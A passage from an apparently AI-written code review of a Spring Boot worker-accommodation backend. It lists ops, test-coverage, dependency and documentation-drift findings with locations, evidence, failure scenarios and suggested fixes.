- **Failure scenario:** A CSV-style id pasted with trailing text → 500; an integration sending `overrideReason: ""` bypasses the gender warning with an empty audit reason.
- **Suggested fix:** `@Size(max = 100)` on `internalId`; use `overrideReason == null || overrideReason.isBlank()`; either drop `DELETED` from the update path (`@Pattern`/custom validator) or route it through `delete()`.
- **Confidence:** HIGH

**Also noted (not filed):**
- `WorkerResponse` (phone, email, date of birth, notes) is returned in full to `FRONT_DESK` on `GET /workers` — a PII-minimisation question for the product owner rather than a defect.
- `PUT /rooms/{id}` may set `status=BLOCKED` or change `genderRule` while occupied and `PUT /beds/{id}` may block an occupied bed; nothing in `/exceptions` surfaces the resulting mismatch (documented as intended).
- Concurrent `bulk-generate` on one room computes the same `nextLabel` and hits `uq_beds_room_label` → 500; same for concurrent room/worker creation on their unique constraints (no `DataIntegrityViolationException` handler).
- `resolveBed` auto-assign runs two count queries per candidate bed sequentially; `bulk-assign` of N workers into an M-bed room is O(N·M) queries — fine at 2–8 beds, worth a single "occupied bed ids for period" query if rooms grow.
- Export filename uses `LocalDate.now()` rather than the requested `date` (documented); the CSV parser in `WorkerService.parseCsvLine` does not handle `""` escapes or quoted newlines.
- `WorkerIntegrationTest.shouldNotReturnWorkersFromOtherAgency` (`WorkerIntegrationTest.java:120-136`) has no assertion on the returned content.
- `PropertyService.delete`'s `error.property.has_stays` branch is unreachable (already documented in the guardrails plan).

### What looked good
- Date overlap semantics are consistently half-open `[dateFrom, dateTo)` in every repository query, and `BedAssignmentIntegrationTest.BoundaryConditions` pins the check-out-day == check-in-day case; do not "fix" that to inclusive.
- Self-exclusion via `excludeStayId` is threaded through update/check-in/move and unit-tested for both `BedOccupancyConstraint` and `DoubleBookingConstraint`.
- Hard-before-soft reporting in `runConstraints` (hard violations never arrive together with soft ones) matches the documented client flow, and `resolveBed` reuses the engine instead of duplicating bed logic across five write paths.
- `StayStatus` owns the transition table in one place; every transition endpoint goes through `canTransitionTo`, and repeated check-in/check-out is safely rejected with 409 rather than double-applied.
- Delete guards on property/room/bed return 409 with message codes before the RESTRICT FKs can fire, including for terminal stays (`DeletionGuardIntegrationTest.shouldReturnConflict_whenOnlyTerminalStaysReferenceRoom`).
- `RoomService` and `OccupancyService` batch stays, workers and beds once per property/page — no N+1 on the room list or occupancy views.
- `SortFields.translate` whitelists sort keys per endpoint and is exercised for workers, rooms, stays, properties and audit; cross-agency ids consistently yield 404, never 403, so tenancy is not leaked through error codes.
- Move refuses on the final day with a message code instead of letting `chk_stays_dates` fail, and every write path logs an audit event with before/after snapshots.

### Coverage of this review
Read in full: every file under `src/main/java/com/beduno/stay/**` (including `constraint/**` and `dto/**`), `occupancy/**`, `bed/**`, `room/**`, `property/**`, `worker/**`, `common/model/**`; plus `GlobalExceptionHandler`, `ConstraintViolationException`, `ErrorResponse`, `BusinessException`, `AuditService`, `CurrentUser`, `TenantContext`, `application.yml`, `docker/Dockerfile`, migrations V3–V5 and V9–V14, the default i18n bundle keys, `CLAUDE.md`, `AGENTS.md`, `docs/architecture.md`, `docs/api-specification.md`, and the head of `context/changes/testing-data-integrity-guardrails/plan.md` (`context/foundation/lessons.md` does not exist). Tests read in full: all of `src/test/java/com/beduno/{stay,bed,room,property,worker,occupancy}/**`, `TestBuilders`, `IntegrationTestBase`. No tests were executed. DOM-01's binding path was verified by disassembling `hibernate-core-6.6.11.Final.jar` and `postgresql-42.7.5.jar` from the Gradle cache (`javap`), but the runtime outcome (silent bypass vs. 500) remains unverified; the exact tag-filtered worker query's SQL null-handling (`:tag = ANY(w.tags)` with `:status IS NULL` without casts) was noted but not exercised.

---

## Area: Data model, build, deployment, tests, docs

### Findings

#### INF-01 — Deploy path runs irreversible migrations with no pre-deploy snapshot; daily backups are opt-in
- **Severity:** HIGH
- **Category:** ops-risk
- **Location:** `deploy/publish.sh:69-77`
  `deploy/backup.sh:102-136`
  `README.md:190-218` (First launch), `README.md:220-229` (Day to day)
- **What:** `publish.sh` restarts `beduno.service`, which pulls the new image and lets Flyway apply pending migrations to the only copy of the database, without first calling `backup.sh snapshot`. The DLM daily policy (`backup.sh enable-daily`) is a manual, optional command that appears nowhere in the "First launch" runbook, so a fresh deployment has zero restore points until someone remembers to enable it.
- **Evidence:**
  ```
  echo "rolling ${INSTANCE_ID} onto the new image"
  if ! COMMAND_ID="$(aws ssm send-command --region "$REGION" \
    ...
    --parameters 'commands=["systemctl restart beduno.service"]' \
  ```
  (no `backup.sh snapshot` anywhere in publish.sh; `instance.sh stop` is the only automatic snapshot trigger)
- **Failure scenario:** A new `V15` with a data backfill ships (the team's own recorded incident class, test-plan risk #6), `publish.sh` rolls it out, the backfill mis-sets rows. `rollback_parameter` reverts the *image* only; the schema/data change is permanent, and the newest snapshot is whenever the instance was last stopped — possibly days old.
- **Suggested fix:** In `publish.sh`, call `"$here/backup.sh" snapshot` (incremental, seconds) immediately before `send-command`, and abort if it fails. Add `deploy/backup.sh enable-daily` to the README "First launch" steps and make `launch.sh` warn when no DLM policy tagged `Project=beduno` exists.
- **Confidence:** HIGH

#### INF-02 — Login and refresh success paths have zero HTTP test coverage
- **Severity:** HIGH
- **Category:** test-gap
- **Location:** `src/test/java/com/beduno/auth/AuthIntegrationTest.java:20-91`
  `src/main/java/com/beduno/auth/AuthController.java:34-49`
- **What:** Every test against `POST /api/v1/auth/login` and `POST /api/v1/auth/refresh` asserts a failure (401/400/405/415). No test logs in with a real bcrypt-hashed user and checks the 200 body, the `expiresIn`, the claims of the returned tokens, or `lastLoginAt`; no test exchanges a valid refresh token for a new pair. `BootstrapRunnerIntegrationTest` checks `passwordEncoder.matches` directly, never through HTTP.
- **Evidence:** grep of `auth/login|auth/refresh` in `src/test` yields only `shouldReturnUnauthorized_whenUserDoesNotExist`, `shouldReturnBadRequest_whenFieldsAreMissing`, `shouldReturnUnauthorized_whenRefreshTokenIsInvalid`, `shouldReturnUnauthorized_whenAccessTokenIsPresentedAsRefreshToken`, plus the `ErrorContractIntegrationTest` 405/400/415 cases.
- **Failure scenario:** A regression in `AuthService.login` (wrong status filter, INACTIVE users allowed, `lastLoginAt` write breaking the transaction, a claim dropped from the access token) ships green; the first person to notice is the operator locked out of production after `publish.sh`.
- **Suggested fix:** Add `shouldReturnTokens_whenCredentialsAreValid` (insert a user via `UserService`/JDBC with a real `passwordEncoder.encode`, POST login, assert 200, non-blank tokens, `user.role`, and that `jwtTokenProvider.getAgencyId(accessToken)` matches), `shouldRejectLogin_whenUserIsInactive`, and `shouldReturnNewPair_whenRefreshTokenIsValid`.
- **Confidence:** HIGH

#### INF-03 — Spring Boot pinned to 3.4.4 (March 2025) with no dependency vulnerability scanning
- **Severity:** HIGH
- **Category:** build
- **Location:** `build.gradle.kts:4`
  `.github/workflows/ci.yml` (no scanning step), `.github/` (no `dependabot.yml`)
- **What:** The BOM is pinned at `3.4.4`, roughly 18 months old at the time of review; the 3.4.x line has left OSS support, and 3.4.4 resolves an embedded Tomcat (10.1.39) and Spring Security/Framework generation for which later patch releases fixed published CVEs, including multipart-upload DoS fixes in Tomcat 10.1.42/10.1.43 that matter because this API exposes `POST /workers/import` (multipart). Nothing in the build or CI checks dependencies for known vulnerabilities.
- **Evidence:**
  ```
  id("org.springframework.boot") version "3.4.4"
  ```
- **Failure scenario:** An authenticated AGENCY_ADMIN (or anyone, for CVEs in request parsing that precede the security filter) sends a crafted request to the single production instance; the JVM is SIGKILLed against its 1024 MB cgroup and the service is down until the systemd restart loop recovers it.
- **Suggested fix:** Bump to the latest 3.4.x patch (or 3.5.x), run `./gradlew dependencies --configuration runtimeClasspath` to confirm Tomcat/Security versions, and add either the OWASP `dependency-check-gradle` plugin to `./gradlew build` or a `.github/dependabot.yml` for `gradle`.
- **Confidence:** MEDIUM — the pin, its age, and the multipart endpoint are verified from the repo; the exact resolved Tomcat version and CVE applicability could not be checked offline.

#### INF-04 — Undocumented cross-tenant queries violate the recorded multi-tenancy rule
- **Severity:** MEDIUM
- **Category:** docs-drift
- **Location:** `src/main/java/com/beduno/occupancy/ExportService.java:90`
  `src/main/java/com/beduno/room/RoomRepository.java:21`
  `src/main/java/com/beduno/bed/BedRepository.java:20`
  `src/main/java/com/beduno/user/UserRepository.java:16-22`
  `CLAUDE.md` (Multi-Tenancy section), `AGENTS.md:7`
- **What:** CLAUDE.md/AGENTS.md sanction exactly three cross-tenant queries and require every new one to be justified there. `ExportService.bedLabelById` uses `bedRepository.findAllById` (the exact pattern CLAUDE.md says "don't reuse"), and `RoomRepository.existsByPropertyIdAndRoomNumber`, `BedRepository.existsByRoomIdAndLabel`, `UserRepository.findByEmail/existsByEmail/existsByEmailAndIdNot` all run with no `agencyId` predicate. None is recorded. `WorkerRepository.findAllByAgencyIdAndIdIn` already exists (used by `RoomService`) and shows the filtered alternative.
- **Evidence:**
  ```
  return bedRepository.findAllById(distinctIds).stream()
          .collect(Collectors.toMap(Bed::getId, Bed::getLabel));
  ```
- **Failure scenario:** A future refactor feeds `bedLabelById` ids from a request body instead of from agency-filtered stays; labels from another agency's beds appear in a CSV export, and nothing in the docs flags the call site as needing review.
- **Suggested fix:** Add `BedRepository.findAllByAgencyIdAndIdIn` and use it in `ExportService` (and replace `OccupancyService.loadWorkers`'s `findAllById` with the existing `findAllByAgencyIdAndIdIn`, removing that exception). Record the remaining uniqueness-check queries in CLAUDE.md and AGENTS.md with the justification that they key on globally unique ids/emails.
- **Confidence:** HIGH

#### INF-05 — Database-level failures (optimistic lock, unique race, column overflow) surface as 500
- **Severity:** MEDIUM
- **Category:** jpa-config
- **Location:** `src/main/java/com/beduno/common/exception/GlobalExceptionHandler.java:123-128`
  `src/main/java/com/beduno/stay/Stay.java:63-65`
  `src/main/java/com/beduno/worker/dto/CreateWorkerRequest.java:2` vs `src/main/resources/db/migration/V3__create_workers.sql:4`
- **What:** `Stay` carries `@Version`, but no handler maps `ObjectOptimisticLockingFailureException` to 409, and none maps `DataIntegrityViolationException` — so the check-then-act uniqueness guards (`existsByEmail`, `existsByRoomIdAndLabel`, `existsByAgencyIdAndInternalId`) become 500s under a race. Separately, `CreateWorkerRequest.internalId` has `@NotBlank` but no `@Size(max = 100)` while `workers.internal_id` is `VARCHAR(100)` — the same hole D10 closed for `NoShowRequest`.
- **Evidence:**
  ```
  @ExceptionHandler(Exception.class)
  public ResponseEntity<ErrorResponse> handleGeneral(Exception ex) {
      log.error("Unhandled exception", ex);
      return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
  ```
- **Failure scenario:** Two front-desk users check in / move the same stay within the same second; the loser gets `INTERNAL_ERROR` and a stack trace in the log instead of a `CONFLICT` it can retry. A worker CSV row with a 101-character internal id: the row is caught by the per-row `catch (Exception e)` as `row_failed`, but the same value via `POST /workers` is a 500.
- **Suggested fix:** Add `@ExceptionHandler(ObjectOptimisticLockingFailureException.class)` -> 409 `error.concurrent_modification` and `@ExceptionHandler(DataIntegrityViolationException.class)` -> 409 `error.conflict` (define both codes in all six bundles). Add `@Size(max = 100)` to `internalId` and a `StayGuardIntegrationTest`-style test for it.
- **Confidence:** HIGH

#### INF-06 — "Today" is computed in the JVM default zone, and nothing pins the container to the business zone
- **Severity:** MEDIUM
- **Category:** ops-risk
- **Location:** `src/main/java/com/beduno/stay/StayScheduler.java:19`
  `src/main/java/com/beduno/room/RoomService.java:162`
  `src/main/java/com/beduno/config/SeedRunner.java:146`
  `docker/Dockerfile:27`, `deploy/docker-compose.prod.yml:44-63`
- **What:** All date-boundary logic uses `LocalDate.now()` with no `ZoneId`; the Dockerfile and compose set no `TZ`/`-Duser.timezone`, so the JVM runs in UTC while the agencies operate in Europe/Warsaw. Instants are stored correctly (TIMESTAMPTZ + `Instant`), but "which day is it" is wrong for up to two hours a day and the cron runs at 07:00/08:00 local.
- **Evidence:**
  ```
  @Scheduled(cron = "${beduno.scheduler.arrival-transition-cron:0 0 6 * * *}")
  public void transitionArrivalsToExpectedToday() {
      var today = LocalDate.now();
  ```
- **Failure scenario:** At 00:30 Warsaw time on 1 May, `GET /properties/{id}/rooms` (which uses `LocalDate.now()` for occupancy) still reports 30 April's occupants, and a stay with `dateFrom = 1 May` is not yet `EXPECTED_TODAY`; a night porter checking someone in at 00:30 gets a 409.
- **Suggested fix:** Introduce a `beduno.time-zone` property (default `Europe/Warsaw`), a `Clock` bean, and use `LocalDate.now(clock)` everywhere; set `zone = "${beduno.time-zone}"` on `@Scheduled`. Alternatively set `ENV TZ=Europe/Warsaw` in the Dockerfile as a stopgap and document it in README.
- **Confidence:** HIGH

#### INF-07 — Two tenant-isolation list tests still assert nothing about exclusion (documented gap, Phase 2 marked complete)
- **Severity:** MEDIUM
- **Category:** test-quality
- **Location:** `src/test/java/com/beduno/worker/WorkerIntegrationTest.java:119-136`
  `src/test/java/com/beduno/property/PropertyIntegrationTest.java:89-103`
  `docs/testing-guidelines.md:168`, `docs/open-questions.md:299-303`, `context/foundation/test-plan.md` (§3 Phase 2 = complete)
- **What:** `testing-guidelines.md` names these two tests as the anti-pattern ("assert the other agency's data is absent"), yet both are unchanged: the worker test ends in comments with no isolation assertion, and the property test asserts only that the querying agency's own row is present. AGENTS.md requires a cross-agency isolation case per module; these are the cases for the two list endpoints.
- **Evidence:**
  ```
  assertThat(body).isNotNull();
  // Workers created for DEFAULT_AGENCY_ID should not appear
  // We can verify by checking no worker from the default agency is returned
  ```
- **Failure scenario:** `WorkerRepository.findAllByAgencyIdWithFilters` loses its `agency_id` predicate in a refactor; both tests still pass, and the cross-agency leak reaches production.
- **Suggested fix:** Capture the ids created for `DEFAULT_AGENCY_ID` and assert `.extracting(WorkerResponse::id).doesNotContain(defaultAgencyWorker.id())` (same for properties), exactly as the guideline's sample shows.
- **Confidence:** HIGH

#### INF-08 — The nightly PLANNED -> EXPECTED_TODAY sweep has zero test coverage
- **Severity:** MEDIUM
- **Category:** test-gap
- **Location:** `src/main/java/com/beduno/stay/StayService.java:278-284`
  `src/main/java/com/beduno/stay/StayScheduler.java:17-22`
  `src/test/java/com/beduno/stay/OperationalWorkflowIntegrationTest.java:613-616`, `:746-748`
- **What:** No test calls `transitionPlannedToExpectedToday` or `StayScheduler`; every test that needs an `EXPECTED_TODAY` stay bypasses the transition with a raw `UPDATE stays SET status = ...`. The lifecycle test even labels that SQL "Scheduler transition (manual trigger)". This is the one sanctioned cross-tenant query and the only way a stay ever becomes checkable-in, and it is unproven.
- **Evidence:**
  ```
  // 2. Scheduler transition (manual trigger)
  forceExpectedToday(stay.id());
  ...
  private void forceExpectedToday(UUID stayId) {
      jdbcTemplate.update("UPDATE stays SET status = 'EXPECTED_TODAY' WHERE id = ?", stayId);
  ```
- **Failure scenario:** `findPlannedArrivingOn` is changed to filter by `TenantContext` "for consistency"; the scheduler thread has no tenant, throws, and no stay is ever promoted — every check-in in production returns 409 the next morning, with all tests green.
- **Suggested fix:** Add `StaySchedulerIntegrationTest`: seed PLANNED stays for two agencies with `dateFrom = today` plus one with tomorrow and one CANCELLED, call `stayService.transitionPlannedToExpectedToday(today)`, assert exactly the two are `EXPECTED_TODAY` across both agencies and the others untouched; assert the return value.
- **Confidence:** HIGH

#### INF-09 — Audit trail content is never asserted anywhere
- **Severity:** MEDIUM
- **Category:** test-gap
- **Location:** `src/test/java/com/beduno/room/RoomSortIntegrationTest.java:80-113`
  `src/test/java/com/beduno/config/SeedRunnerIntegrationTest.java:102-103`
  `context/foundation/test-plan.md` §6.4 ("assert request -> response shape AND the resulting database/audit-log state")
- **What:** The only tests touching `GET /api/v1/audit` assert the status code; the only test touching `audit_events` asserts `COUNT(*) > 0` after seeding. No test asserts that a check-in/move/cancel/delete writes an event with the right `action`, `actorUserId`, `previousState`/`newState`, or that the `entityId`/`actorUserId`/`dateTo` filters actually filter. The test plan's own cookbook rule for new endpoint tests is not followed by any existing test.
- **Evidence:**
  ```
  var response = restTemplate.exchange("/api/v1/audit?sort=createdAt,desc", HttpMethod.GET,
          new HttpEntity<>(authHeaders(Role.AGENCY_ADMIN)), String.class);
  assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
  ```
- **Failure scenario:** Q19 in `open-questions.md` (check-in snapshots the *new* room as "previous state") is exactly the class of bug this would catch; a similar regression in `snapshot()` or a dropped `auditService.log` call in a new write path (architecture.md warns "a new write path must remember to log for itself") ships silently.
- **Suggested fix:** Add `AuditIntegrationTest`: perform a check-in as a persisted user, then `GET /audit?entityType=STAY&entityId=<id>` and assert one `CHECKED_IN` event whose `actorUserId` is that user and whose `previousState.status` is `EXPECTED_TODAY`; add a FRONT_DESK 403 case and an `actorUserId` filter case.
- **Confidence:** HIGH

#### INF-10 — `arrivals/export`, `exceptions/export`, and the `GET /stays` date/status/property filters are untested
- **Severity:** MEDIUM
- **Category:** test-gap
- **Location:** `src/main/java/com/beduno/occupancy/OccupancyController.java:88-101`
  `src/test/java/com/beduno/occupancy/ExportIntegrationTest.java` (occupancy export only)
  `src/main/java/com/beduno/stay/StayRepository.java:31-58` vs `src/test/java/com/beduno/stay/StayIntegrationTest.java:207-227`
- **What:** Two of the three CSV endpoints have no test at all (grep for `arrivals/export|exceptions/export` in `src/test` is empty), so their headers, role gates (FRONT_DESK allowed on arrivals only), localization and row shape are unverified. `findAllWithFilters` has five optional predicates; only `workerId` is exercised. The date-overlap predicate (`date_to IS NULL OR date_to >= :dateFrom` / `date_from <= :dateTo`) — the one most likely to be off by one — is never asserted.
- **Evidence:** `ExportIntegrationTest` builds every URL as `"/api/v1/properties/" + propertyId + "/occupancy/export"`; `StayIntegrationTest` has one list test, `shouldReturnPagedList_whenFilteredByWorkerId`.
- **Failure scenario:** The `CAST(:dateFrom AS DATE) IS NULL OR ...` guard is edited and the null-date branch stops matching open-ended stays; the planner's stay list silently omits every open-ended stay in the requested window.
- **Suggested fix:** Extend `ExportIntegrationTest` with one nested class per export (header assertion per language, FRONT_DESK 403 on occupancy/exceptions, 200 on arrivals); add `StayIntegrationTest.ListFilters` covering `status`, `propertyId`, an overlapping window, a non-overlapping window, and an open-ended stay.
- **Confidence:** HIGH

#### INF-11 — Deploy files on the box are frozen at first launch; no procedure or script updates them
- **Severity:** MEDIUM
- **Category:** ops-risk
- **Location:** `deploy/user-data.sh:26-29`
  `deploy/render-user-data.py:14`
  `deploy/Caddyfile:15-18`
  `README.md:186-188`
- **What:** `boot.sh`, `docker-compose.prod.yml` and the `Caddyfile` reach `/opt/beduno` only through cloud-init on the very first boot. `publish.sh` updates the image only. The README acknowledges this once, in the seed paragraph ("push the updated deploy files onto it first"), but never says how, and there is no `deploy/sync.sh`. The Caddyfile's own instruction to refresh the CloudFront trusted-proxy ranges therefore has no path to production.
- **Evidence:**
  ```
  # __FILES__ is replaced at launch time with heredocs writing docker-compose.prod.yml, Caddyfile
  # and boot.sh into APP_DIR.
  ```
  and README: "if the instance was launched before this variable existed, push the updated deploy files onto it first (see `deploy/render-user-data.py` ...)".
- **Failure scenario:** A reviewer merges a Caddyfile change adding `request_body max_size` or new CloudFront ranges; CI passes (`render-user-data.py` renders), `publish.sh` succeeds, and the box keeps serving the old Caddyfile indefinitely — the repo and production disagree with no signal.
- **Suggested fix:** Add `deploy/sync.sh` that renders the same three heredocs and applies them via `aws ssm send-command` (then `systemctl restart beduno.service`), and have `publish.sh` refuse (or warn) when `git diff --quiet HEAD~N -- deploy/` shows those files changed since the last sync. Document it under "Day to day".
- **Confidence:** HIGH

#### INF-12 — `publish.sh` can publish a build that never passed tests or checkstyle
- **Severity:** MEDIUM
- **Category:** deploy
- **Location:** `deploy/publish.sh:18-24`, `:33-38`
  `docker/Dockerfile:7`
  `.github/workflows/ci.yml:6-9`
- **What:** The image is built with `./gradlew bootJar -x test` (no tests, no `check`/checkstyle). The only gate is the dirty-tree check, with an `ALLOW_DIRTY=1` bypass. Nothing verifies that HEAD has been pushed, that it is on `main`, or that CI is green for it — and CI only runs on `push` to `main` or on PRs, so a local branch commit is never tested by anything.
- **Evidence:**
  ```
  TAG="${TAG:-$(git -C "$root" rev-parse --short HEAD)}"
  ...
  RUN ./gradlew bootJar --no-daemon -x test
  ```
- **Failure scenario:** An operator commits on a feature branch, runs `deploy/publish.sh` to "try it in prod", and ships code that fails `MessageBundleTest` (missing i18n key) or a constraint-engine regression — the sha-tag makes it look deliberate and traceable, but nothing ran the 140+ tests.
- **Suggested fix:** In `publish.sh`, before building: `git fetch origin && [ "$(git rev-parse HEAD)" = "$(git rev-parse origin/main)" ] || fail`, then `gh run list --commit "$(git rev-parse HEAD)" --status success --json conclusion` (or a local `./gradlew build`) as a gate; keep `ALLOW_DIRTY` but require an explicit `ALLOW_UNTESTED=1` too.
- **Confidence:** HIGH

#### INF-13 — README's rollback contract is already broken by V9/V13, and the doc does not say so
- **Severity:** MEDIUM
- **Category:** migration
- **Location:** `README.md:246-257`
  `src/main/resources/db/migration/V9__room_contract_alignment.sql:11-15`
  `src/main/resources/db/migration/V13__drop_room_capacity.sql:5-9`
  `src/main/resources/db/migration/V14__require_stay_bed.sql:7`
- **What:** README promises rollback by re-pointing `APP_IMAGE` and says "never drop or rename one in the same release that stops using it". V9 renamed `rooms.name` -> `room_number` and V13 dropped `capacity`/`blocked_spots` in the same commits as the entity changes, so any image before `c6daf46` / `ce21d1b` fails `ddl-auto: validate` on start (`Room` maps `capacity`). The rollback floor is undocumented. V14 also has no defensive backfill: any `stays.bed_id IS NULL` row (possible if V11-V13 code ran before the V14 code) aborts the migration and the app never starts.
- **Evidence:**
  ```
  ALTER TABLE rooms
      DROP CONSTRAINT chk_rooms_capacity,
      DROP CONSTRAINT chk_rooms_blocked_spots,
      DROP COLUMN capacity,
      DROP COLUMN blocked_spots;
  ```
- **Failure scenario:** A regression is found in the named-beds release; the operator follows the README rollback, points `APP_IMAGE` at the pre-named-beds sha, restarts, and `boot.sh` fails `--wait` — the systemd unit now crash-loops on every boot until someone re-points the parameter forward.
- **Suggested fix:** Document in README that the rollback floor is `edcbb8d` (named-beds p4) and why. Adopt expand/contract for future schema changes: rename/drop only in the release *after* the code stops mapping a column. For V14-style tightening, a future `V15+__...sql` should precede `SET NOT NULL` with an idempotent backfill (`UPDATE ... WHERE bed_id IS NULL`) so it is safe on populated data.
- **Confidence:** HIGH

#### INF-14 — `docs/api-specification.md` (the frontend contract) contradicts the code in many places
- **Severity:** MEDIUM
- **Category:** docs-drift
- **Location:** `docs/api-specification.md:113` (500-on-binding caveat), `:116-117` (rate limit keyed on first XFF entry), `:124-125` (CORS "any origin ... credentials"), `:222-223`, `:625`, `:645`, `:1370` (`GenderRule ANY`), `:251` (`AuditEntityType` without `USER`), `:337`, `:342`, `:507`, `:596`, `:774-777` (snake_case sort keys), `:623-626` (room `name`, string `floor`), `:1351-1358` (Users API "not built"), `:1405-1407` (`RoomResponse.occupants`/`roomNumber` "not built")
- **What:** The header says "Reconciled against the implementation", but the document mixes fresh 11-Sep-2026 notes with statements that are false today: `GlobalExceptionHandler` *does* extend `ResponseEntityExceptionHandler` (`ErrorContractIntegrationTest` proves 400/405/415); the throttle keys on the peer address (`RateLimitFilterTest.ForwardedHeaderSpoofing`); CORS is an allowlist; `GenderRule` is `MIXED|MALE_ONLY|FEMALE_ONLY` (V9); `AuditEntityType` includes `USER`; sort keys are camelCase and snake_case is a 400 (`WorkerSortIntegrationTest`); rooms use `roomNumber` and integer `floor`; `UserController` with GET/POST/PUT/DELETE exists; `RoomResponse.occupants`/`currentOccupancy`/`roomNumber` exist (§4 of the same file documents them). `openapi.yaml` is correct on all of these.
- **Evidence:**
  ```
  ### GenderRule
  ANY | MALE_ONLY | FEMALE_ONLY
  ```
  and `| GET /api/v1/users | **Not built.** There is no UserController at all ...`
- **Failure scenario:** The frontend team, told to build from this document, sends `genderRule: "ANY"` (400) or `sort=last_name` (400), or never builds the user-management screens because the appendix says the API does not exist.
- **Suggested fix:** Re-reconcile the file against `openapi.yaml` (already regenerated 2026-09-14): fix the enum blocks, delete the users/room-response/roomNumber rows from the appendix, replace the three stale caveats (binding errors, XFF, CORS) with the current behaviour, and change every `sort=` example to camelCase.
- **Confidence:** HIGH

#### INF-15 — README still describes the capacity model and understates property scoping; Users and Beds are missing from the API overview
- **Severity:** MEDIUM
- **Category:** docs-drift
- **Location:** `README.md:389` (CapacityConstraint), `:348`, `:374-380` (scoping "two endpoints"), `:299-361` (API Overview has no Users or Beds section)
- **What:** The constraint list names `CapacityConstraint (hard) — room capacity minus blocked spots`, which V13 removed (`BedOccupancyConstraint` replaced it; no such class exists). Scoping is now enforced on beds too (`BedController.java:108`), so "only ... two endpoints" is wrong. The overview tables omit `/api/v1/users` (five endpoints) and `/api/v1/properties/{id}/rooms/{roomId}/beds` (six endpoints), though both are in `openapi.yaml`.
- **Evidence:**
  ```
  - **CapacityConstraint** (hard) — room capacity minus blocked spots
  ```
- **Failure scenario:** A new contributor (or agent) following README looks for `CapacityConstraint` to add a rule, or assumes beds are unscoped and skips the check when adding a bed endpoint.
- **Suggested fix:** Replace the constraint bullets with `BedOccupancyConstraint` / `BED_BLOCKED` / `BED_UNAVAILABLE`, list beds among the scoped endpoints, and add Users and Beds tables to the API overview (roles per `UserController`/`BedController`).
- **Confidence:** HIGH

#### INF-16 — `test-plan.md` status claims do not match the tests that exist
- **Severity:** MEDIUM
- **Category:** docs-drift
- **Location:** `context/foundation/test-plan.md` §3 (Phase 2 = `complete`, Phase 4 = `not started`), §4 (CI row: "none ... No `.github/workflows/`"), §5 ("No CI pipeline exists")
  `src/test/java/com/beduno/stay/OperationalWorkflowIntegrationTest.java:207-233`, `:486-507`
  `src/test/java/com/beduno/common/security/RateLimitFilterTest.java:78-100`
  `.github/workflows/ci.yml`
- **What:** Phase 2's goal is "Prove property-scoping ... hold[s] across every write path", marked complete — but the shipped tests are trip-wires that assert a PROPERTY_ADMIN *can* check in and read occupancy at an unassigned property (the insecure behaviour). Phase 4 (rate-limit forged-header bypass) is "not started", yet `RateLimitFilterTest.ForwardedHeaderSpoofing` already covers exactly risk #7. The plan says there is no CI, but `ci.yml` (build + shellcheck + user-data render) has been committed since 2026-09-10, before the plan's 2026-09-12 update.
- **Evidence:**
  ```
  // Documents a known gap ... This test intentionally asserts
  // today's actual (insecure) behavior as a trip-wire
  @Test
  void shouldAllowCheckIn_whenPropertyAdminNotAssignedToStaysProperty() {
  ```
- **Failure scenario:** Someone reads "Phase 2 complete" as "risk #3 closed" and deprioritises roadmap slice S-08; the IDOR-class gap the plan ranks High impact stays open while the ledger says it is covered.
- **Suggested fix:** Change Phase 2's status/goal to record that scoping is *documented, not enforced* for stays/occupancy (or split a Phase 2b "enforce"), mark Phase 4 as covered by the existing test with a link, and update §4/§5 to reference `ci.yml`.
- **Confidence:** HIGH

#### INF-17 — Architecture/testing/coding docs and deploy comments describe pre-V9/V13 and pre-Users code
- **Severity:** MEDIUM
- **Category:** docs-drift
- **Location:** `docs/architecture.md:88`, `:316-320`, `:332`, `:375`, `:391-395`, `:490-491`, `:498-499`, `:569`
  `docs/testing-guidelines.md:59`, `:118`
  `docs/coding-guidelines.md:120-126`, `:187`
  `docs/overview.md:25`, `:50`; `docs/open-questions.md:156`, `:173-177`, `:208-215`
  `deploy/docker-compose.prod.yml:54`, `deploy/boot.sh:34`, `:65`
- **What:** `architecture.md` (header: "reconciled 2026-09-11") still shows `rooms(name, gender_rule DEFAULT 'ANY', UNIQUE(property_id,name))`, `bed_auto_assigned ... DEFAULT false` (V11 says `true`), "Bed delete -> no guard against stays referencing it" (`BedService.delete` has `error.bed.has_stays`), audit on four entity types (there are six), scoping in "exactly two places", and "there is no user-management API". `testing-guidelines.md` sample code constructs the non-existent `CapacityConstraint` and claims "each test class gets a clean database state via `@Transactional` rollback" (there is no rollback or cleanup in `IntegrationTestBase`). `coding-guidelines.md` promises a `Location` header on 201 that api-spec says is never set. `open-questions.md` lists Q9 (sort 500s) and Q16 (binding errors 500) as open though both are fixed and tested. Three deploy comments say "There is no user-management API".
- **Evidence:**
  ```
  - Bed delete -> hard delete; no guard against stays referencing it, since `stays.bed_id` is
    `NOT NULL` (V14) and every stay-write path re-resolves a bed through `StayService.resolveBed`
  ```
- **Failure scenario:** The delete-guard rule (test-plan risk #4) is applied to the next entity by copying architecture.md's description, and a reviewer concludes bed deletion needs no guard — the opposite of the code and of `BedIntegrationTest.shouldRejectDelete_whenStayReferencesBed`.
- **Suggested fix:** One reconciliation pass over the listed lines; mark Q9/Q16 fixed; delete the three "no user-management API" comments in `deploy/`; replace the testing-guidelines cleanup sentence with the real rule (unique ids per test, no cleanup).
- **Confidence:** HIGH

#### INF-18 — Build and runtime images are not pinned; every boot pulls whatever the floating tags resolve to
- **Severity:** LOW
- **Category:** docker
- **Location:** `gradle/wrapper/gradle-wrapper.properties:3`
  `docker/Dockerfile:1`, `:9`
  `deploy/docker-compose.prod.yml:15`, `:75`
  `deploy/boot.sh:111`
  `deploy/user-data.sh:18-21`
- **What:** No `distributionSha256Sum` for the Gradle distribution (CI validates only the wrapper jar); `eclipse-temurin:21-jdk-alpine`/`21-jre-alpine` are unpinned; `postgres:16-alpine` and `caddy:2-alpine` are re-pulled by `docker compose pull` on *every* boot, so a Postgres minor or Caddy 2.x minor upgrade happens silently at whatever start follows its release; the compose binary is downloaded from GitHub with no checksum.
- **Evidence:**
  ```
  docker compose -f docker-compose.prod.yml --env-file "$ENV_FILE" pull
  ```
- **Failure scenario:** A Caddy 2.x release changes `trusted_proxies`/`client_ip` semantics; the next `instance.sh start` picks it up and the login throttle starts keying on the CloudFront edge, exactly the outage the Caddyfile comment describes.
- **Suggested fix:** Pin `postgres:16.x-alpine`, `caddy:2.x.y-alpine` (or digests) in compose, pin the JDK/JRE images by digest, add `distributionSha256Sum` to the wrapper properties, and add `sha256sum -c` for the compose binary in `user-data.sh`.
